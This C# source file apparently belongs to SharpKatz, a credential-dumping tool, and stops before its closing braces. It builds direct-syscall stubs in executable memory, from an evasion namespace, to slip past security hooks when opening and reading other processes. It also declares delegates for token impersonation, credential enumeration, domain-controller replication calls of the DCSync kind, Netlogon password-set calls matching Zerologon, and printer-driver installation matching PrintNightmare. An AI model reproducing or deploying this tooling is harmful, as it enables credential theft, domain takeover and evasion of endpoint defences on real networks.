using SharpKatz.Crypto;
using SharpKatz.Evasion;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using static SharpKatz.Win32.Natives;

namespace SharpKatz.Win32
{
    class SysCall
    {
        const int memoryProtection = 0x40; // PAGE_EXECUTE_READWRITE

        /// <summary>
        /// Prepare a syscall stub: resolve SSN, allocate executable memory, return address.
        /// Caller MUST free the GCHandle in a finally block after invocation.
        /// </summary>
        private static IntPtr PrepareSyscallStub(string ntFunction, out GCHandle pinnedHandle)
        {
            byte[] stub = SsnResolver.BuildSyscallStub(ntFunction);
            pinnedHandle = GCHandle.Alloc(stub, GCHandleType.Pinned);
            IntPtr addr = pinnedHandle.AddrOfPinnedObject();

            if (!Natives.VirtualProtect(addr, (UIntPtr)stub.Length, memoryProtection, out _))
            {
                pinnedHandle.Free();
                throw new Win32Exception();
            }

            return addr;
        }

        public static NTSTATUS ZwOpenProcess10(ref IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid)
        {
            IntPtr addr = PrepareSyscallStub("ZwOpenProcess", out GCHandle pin);
            try
            {
                var fn = (Delegates.ZwOpenProcess)Marshal.GetDelegateForFunctionPointer(addr, typeof(Delegates.ZwOpenProcess));
                return (NTSTATUS)fn(out hProcess, processAccess, objAttribute, ref clientid);
            }
            finally { pin.Free(); }
        }

        public static NTSTATUS ZwClose10(IntPtr handle)
        {
            IntPtr addr = PrepareSyscallStub("ZwClose", out GCHandle pin);
            try
            {
                var fn = (Delegates.ZwClose)Marshal.GetDelegateForFunctionPointer(addr, typeof(Delegates.ZwClose));
                return (NTSTATUS)fn(handle);
            }
            finally { pin.Free(); }
        }

        public static NTSTATUS ZwQuerySystemInformation10(SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, ref uint ReturnLength)
        {
            IntPtr addr = PrepareSyscallStub("ZwQuerySystemInformation", out GCHandle pin);
            try
            {
                var fn = (Delegates.ZwQuerySystemInformation)Marshal.GetDelegateForFunctionPointer(addr, typeof(Delegates.ZwQuerySystemInformation));
                return (NTSTATUS)fn(SystemInformationClass, SystemInformation, SystemInformationLength, ref ReturnLength);
            }
            finally { pin.Free(); }
        }

        public static NTSTATUS NtReadVirtualMemory10(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, int NumberOfBytesToRead, int NumberOfBytesRead)
        {
            IntPtr addr = PrepareSyscallStub("NtReadVirtualMemory", out GCHandle pin);
            try
            {
                var fn = (Delegates.NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(addr, typeof(Delegates.NtReadVirtualMemory));
                return (NTSTATUS)fn(ProcessHandle, BaseAddress, Buffer, NumberOfBytesToRead, NumberOfBytesRead);
            }
            finally { pin.Free(); }
        }

        public static NTSTATUS NtWriteVirtualMemory10(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten)
        {
            IntPtr addr = PrepareSyscallStub("NtWriteVirtualMemory", out GCHandle pin);
            try
            {
                var fn = (Delegates.ZwWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(addr, typeof(Delegates.ZwWriteVirtualMemory));
                return (NTSTATUS)fn(hProcess, lpBaseAddress, lpBuffer, nSize, ref lpNumberOfBytesWritten);
            }
            finally { pin.Free(); }
        }

        public static NTSTATUS NtAllocateVirtualMemory10(IntPtr hProcess, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect)
        {
            IntPtr addr = PrepareSyscallStub("NtAllocateVirtualMemory", out GCHandle pin);
            try
            {
                var fn = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(addr, typeof(Delegates.NtAllocateVirtualMemory));
                return (NTSTATUS)fn(hProcess, ref BaseAddress, ZeroBits, ref RegionSize, AllocationType, Protect);
            }
            finally { pin.Free(); }
        }

        public static NTSTATUS NtFreeVirtualMemory10(IntPtr hProcess, ref IntPtr BaseAddress, ref uint RegionSize, ulong FreeType)
        {
            IntPtr addr = PrepareSyscallStub("NtFreeVirtualMemory", out GCHandle pin);
            try
            {
                var fn = (Delegates.NtFreeVirtualMemory)Marshal.GetDelegateForFunctionPointer(addr, typeof(Delegates.NtFreeVirtualMemory));
                return (NTSTATUS)fn(hProcess, ref BaseAddress, ref RegionSize, FreeType);
            }
            finally { pin.Free(); }
        }

        public struct Delegates
        {
            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int ZwOpenProcess(out IntPtr hProcess, ProcessAccessFlags processAccess, OBJECT_ATTRIBUTES objAttribute, ref CLIENT_ID clientid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int ZwClose(IntPtr handle);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int ZwQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, IntPtr SystemInformation, uint SystemInformationLength, ref uint ReturnLength);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtReadVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, int NumberOfBytesToRead, int NumberOfBytesRead);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int ZwWriteVirtualMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, uint nSize, ref IntPtr lpNumberOfBytesWritten);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref UIntPtr RegionSize, ulong AllocationType, ulong Protect);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtFreeVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref uint RegionSize, ulong FreeType);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool RtlEqualUnicodeString(UNICODE_STRING String1, UNICODE_STRING String2, bool CaseInSensitive);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool RtlGetVersion(ref OSVERSIONINFOEXW lpVersionInformation);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void RtlGetNtVersionNumbers(out UInt32 major, out UInt32 minor, out UInt32 build);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool RtlInitUnicodeString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPWStr)] string SourceString);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool RtlInitString(ref UNICODE_STRING DestinationString, [MarshalAs(UnmanagedType.LPStr)] string SourceString);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool OpenProcessToken(IntPtr hProcess, UInt32 dwDesiredAccess, out IntPtr hToken);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int LdrLoadDll(IntPtr PathToFile, UInt32 dwFlags, ref Natives.UNICODE_STRING ModuleFileName, ref IntPtr ModuleHandle);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int NtFilterToken(IntPtr TokenHandle, uint Flags, IntPtr SidsToDisable, IntPtr PrivilegesToDelete, IntPtr RestrictedSids, ref IntPtr hToken);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr GetCurrentProcess();

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool CloseHandle(IntPtr handle);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool GetTokenInformation(IntPtr TokenHandle, TOKEN_INFORMATION_CLASS TokenInformationClass, IntPtr TokenInformation, UInt32 TokenInformationLength, out UInt32 ReturnLength);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool LookupPrivilegeValue(string lpSystemName, String lpName, ref LUID luid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, UInt32 BufferLengthInBytes, ref TOKEN_PRIVILEGES PreviousState, out UInt32 ReturnLengthInBytes);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool LookupAccountNameA( string lpSystemName, string lpAccountName, byte[] Sid, ref uint cbSid, StringBuilder ReferencedDomainName, ref uint cchReferencedDomainName, out SID_NAME_USE peUse);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool ConvertSidToStringSid(byte[] pSID, out string ptrSid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool ConvertSidToStringSid2(IntPtr pSID, out string ptrSid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool ConvertStringSidToSid(string stringsid, out IntPtr ptrSid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int RpcBindingFromStringBinding(string bindingString, out IntPtr lpBinding);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int I_RpcBindingInqSecurityContext(IntPtr Binding, out IntPtr SecurityContextHandle);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate IntPtr NdrClientCall2_1(IntPtr pMIDL_STUB_DESC, IntPtr formatString, ref IntPtr hDrs);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate IntPtr NdrClientCall2_2(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hBinding, Guid NtdsDsaObjectGuid, DRS_EXTENSIONS_INT ext_int, ref IntPtr pDrsExtensionsExt, ref IntPtr hDrs);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate IntPtr NdrClientCall2_3(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hDrs, uint dcInVersion, DRS_MSG_DCINFOREQ_V1 dcInfoReq, ref uint dcOutVersion, ref DRS_MSG_DCINFOREPLY_V2 dcInfoRep);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate IntPtr NdrClientCall2_4(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hDrs, uint dcInVersion, DRS_MSG_CRACKREQ_V1 dcInfoReq, ref uint dcOutVersion, ref IntPtr dcInfoRep);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate IntPtr NdrClientCall2_5(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hDrs, uint dwInVersion, DRS_MSG_GETCHGREQ_V8 pmsgIn, ref uint dwOutVersion, ref DRS_MSG_GETCHGREPLY_V6 pmsgOut);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int RpcBindingFree(ref IntPtr lpString);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int RpcStringBindingCompose(String ObjUuid, String ProtSeq, String NetworkAddr, String Endpoint, String Options, out IntPtr lpBindingString);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int RpcBindingSetAuthInfoEx(IntPtr lpBinding, string ServerPrincName, UInt32 AuthnLevel, UInt32 AuthnSvc, IntPtr identity, UInt32 AuthzSvc, ref RPC_SECURITY_QOS SecurityQOS);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int RpcBindingSetOption(IntPtr Binding, UInt32 Option, IntPtr OptionValue);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int RpcBindingSetObject(IntPtr Binding, ref Guid val);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int RpcEpResolveBinding(IntPtr Binding, IntPtr IfSpec);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate IntPtr CreateFileW(string lpFileName, uint dwDesiredAccess, uint dwShareMode, ref SECURITY_ATTRIBUTES lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int RegQueryValueEx(IntPtr hKey, string lpValueName, IntPtr lpReserved, ref uint lpType, IntPtr lpData, ref uint lpcbData);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate IntPtr RpcAsyncEnumPrinterDrivers(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hBinding, StringBuilder pName, string pEnvironment, uint level, IntPtr drivers, uint cbBuf, ref uint pcbNeeded, ref uint pcReturned);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate IntPtr RpcAsyncAddPrinterDriver(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr hBinding, StringBuilder pName, IntPtr pDriverContainer, uint dwFileCopyFlags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int RtlDecryptDES2blocks1DWORD(byte[] data, ref UInt32 key, IntPtr output);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr GetSidSubAuthority(IntPtr sid, UInt32 subAuthorityIndex);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr GetSidSubAuthorityCount(IntPtr psid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int RtlEncryptDecryptRC4(ref CRYPTO_BUFFER data, ref CRYPTO_BUFFER key);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int QueryContextAttributes(IntPtr hContext, uint ulAttribute, ref SecPkgContext_SessionKey pContextAttributes);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, int flags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            internal delegate int BCryptDestroyKey(IntPtr hKey);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int BCryptOpenAlgorithmProvider(out SafeBCryptAlgorithmHandle phAlgorithm, string pszAlgId, string pszImplementation, int dwFlags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int BCryptSetProperty(SafeHandle hProvider, string pszProperty, string pbInput, int cbInput, int dwFlags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int BCryptGenerateSymmetricKey(SafeBCryptAlgorithmHandle hAlgorithm, out SafeBCryptKeyHandle phKey, IntPtr pbKeyObject, int cbKeyObject, IntPtr pbSecret, int cbSecret, int flags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int BCryptDecrypt(SafeBCryptKeyHandle hKey, IntPtr pbInput, int cbInput, IntPtr pPaddingInfo, IntPtr pbIV, int cbIV, IntPtr pbOutput, int cbOutput, out int pcbResult, int dwFlags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate int BCryptEncrypt(SafeBCryptKeyHandle hKey, IntPtr pbInput, int cbInput, IntPtr pPaddingInfo, IntPtr pbIV, int cbIV, IntPtr pbOutput, int cbOutput, out int pcbResult, int dwFlags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr ASN1_CreateModule(uint nVersion, uint eRule, uint dwFlags, uint cPDU, IntPtr[] apfnEncoder, IntPtr[] apfnDecoder, IntPtr[] apfnFreeMemory, int[] acbStructSize, uint nModuleName);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate ASN1error_e ASN1_CreateEncoder(IntPtr pModule, out IntPtr ppEncoderInfo, IntPtr pbBuf, uint cbBufSize, IntPtr pParent);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate ASN1error_e ASN1_CreateDecoder(IntPtr pModule, out IntPtr ppDecoderInfo, IntPtr pbBuf, uint cbBufSize, IntPtr pParent);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool ASN1BERDotVal2Eoid(IntPtr pEncoderInfo, string dotOID, IntPtr encodedOID);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void ASN1_FreeEncoded(ref ASN1encoding_s pEncoderInfo, IntPtr pBuf);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void ASN1_CloseEncoder(IntPtr pEncoderInfo);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void ASN1_CloseDecoder(IntPtr pDecoderInfo);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void ASN1_CloseModule(IntPtr pModule);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate bool CreateProcessWithLogonW(string userName, string domain, string password, LogonFlags dwLogonFlags, string applicationName, string commandLine, CreationFlags dwCreationFlags, uint environment, string currentDirectory, ref STARTUPINFO startupInfo, out PROCESS_INFORMATION processInformation);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpTokenAttributes, int ImpersonationLevel, int TokenType, ref IntPtr phNewToken);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool SetThreadToken(IntPtr pHandle, IntPtr hToken);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void NtResumeProcess(IntPtr hProcess);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate uint NtTerminateProcess(IntPtr hProcess, uint uExitCode);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate uint NetrServerReqChallenge(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr PrimaryName, IntPtr ComputerName, IntPtr ClientChallenge, out NETLOGON_CREDENTIAL ServerChallenge);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate uint NetrServerAuthenticate3(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr PrimaryName, IntPtr AccountName, NETLOGON_SECURE_CHANNEL_TYPE SecoureChannelType, IntPtr ComputerName, IntPtr ClientChallenge, out NETLOGON_CREDENTIAL ServerChallenge, out uint NegotiateFlags, out uint AccountRid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate uint NetServerPasswordSet2(IntPtr pMIDL_STUB_DESC, IntPtr formatString, IntPtr PrimaryName, IntPtr AccountName, NETLOGON_SECURE_CHANNEL_TYPE AccountType, IntPtr ComputerName, IntPtr Authenticator, IntPtr ReturnAuthenticator, IntPtr ClearNewPassword);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool LogonUser(string pszUserName, string pszDomain, string pszPassword, int dwLogonType, int dwLogonProvider, ref IntPtr phToken);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool ImpersonateLoggedOnUser(IntPtr hToken);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool RevertToSelf();

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int RegOpenKeyExW(IntPtr hKey, string lpSubKey, uint ulOptions, ACCESS_MASK samDesired, IntPtr phkResult);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int RegQueryInfoKeyW(IntPtr hKey, IntPtr lpClass, IntPtr lpcchClass, ref uint lpReserved, IntPtr lpcSubKeys, IntPtr lpcbMaxSubKeyLen, IntPtr lpcbMaxClassLen, IntPtr lpcValues, IntPtr lpcbMaxValueNameLen, IntPtr lpcbMaxValueLen, IntPtr lpcbSecurityDescriptor, IntPtr lpftLastWriteTime);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int RegCloseKey(IntPtr hKey);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
            public delegate bool CryptAcquireContextA(ref IntPtr phProv, string szContainer, string szProvider, uint dwProvType, uint dwFlags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
            public delegate bool CryptSetKeyParam(IntPtr hKey, uint dwParam, IntPtr pbData, uint dwFlags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
            public delegate bool CryptDestroyKey(IntPtr hKey);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
            public delegate bool CryptReleaseContext(IntPtr hProv, uint dwFlags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
            public delegate bool CryptImportKey(IntPtr hProv, IntPtr pbData, uint dwDataLen, IntPtr hPubKey, uint dwFlags, ref IntPtr phKey);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
            public delegate bool CryptGetProvParam(IntPtr hProv, uint dwParam, IntPtr pbData, ref uint pdwDataLen, uint dwFlags);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
            public delegate bool CryptExportKey(IntPtr hKey, IntPtr hExpKey, uint dwBlobType, uint dwFlags, IntPtr pbData, ref uint pdwDataLen);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
            public delegate bool CryptGenKey(IntPtr hProv, uint Algid, uint dwFlags, IntPtr phKey);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi, SetLastError = true)]
            public delegate bool CryptDecrypt(IntPtr hKey, IntPtr hHash, bool Final, uint dwFlags, IntPtr pbData, ref uint pdwDataLen);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Ansi)]
            public delegate int RegEnumKeyExW(IntPtr hKey, uint dwIndex, IntPtr lpName, IntPtr lpcchName, IntPtr lpReserved, IntPtr lpClass, IntPtr lpcchClass, IntPtr lpftLastWriteTime);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr CreateFileMappingA(IntPtr hFile, IntPtr lpFileMappingAttributes, uint flProtect, uint dwMaximumSizeHigh, uint dwMaximumSizeLow, IntPtr lpName);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr MapViewOfFile(IntPtr hFileMappingObject, uint dwDesiredAccess, uint dwFileOffsetHigh, uint dwFileOffsetLow, long dwNumberOfBytesToMap);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate bool UnmapViewOfFile(IntPtr lpBaseAddress);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int NtOpenDirectoryObject(ref IntPtr DirectoryHandle, ACCESS_MASK DesiredAccess, IntPtr ObjectAttributes);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate int NtQueryDirectoryObject(IntPtr DirectoryHandle, byte[] Buffer, uint Length, bool ReturnSingleEntry, bool RestartScan, ref uint Context, ref uint ReturnLength);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate bool GetFileAttributesExW(string lpFileName, GET_FILEEX_INFO_LEVELS fInfoLevelId, ref WIN32_FILE_ATTRIBUTE_DATA lpFileInformation);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate bool LookupAccountSidW(
                IntPtr lpSystemName, IntPtr Sid, IntPtr lpName, ref int cchName,
                IntPtr ReferencedDomainName, ref int cchReferencedDomainName, ref int peUse);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate bool ConvertSidToStringSidW(IntPtr Sid, ref IntPtr StringSid);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate IntPtr LocalFree(IntPtr hMem);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate bool CredEnumerateW(
                string filter, int flags, ref int count, ref IntPtr credentials);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            public delegate void CredFree(IntPtr buffer);

            [SuppressUnmanagedCodeSecurity]
            [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
            public delegate bool CreateProcessW(
                string lpApplicationName, string lpCommandLine,
                ref SECURITY_ATTRIBUTES lpProcessAttributes, ref SECURITY_ATTRIBUTES lpThreadAttributes,
                bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment,
                string lpCurrentDirectory, ref STARTUPINFOEX lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

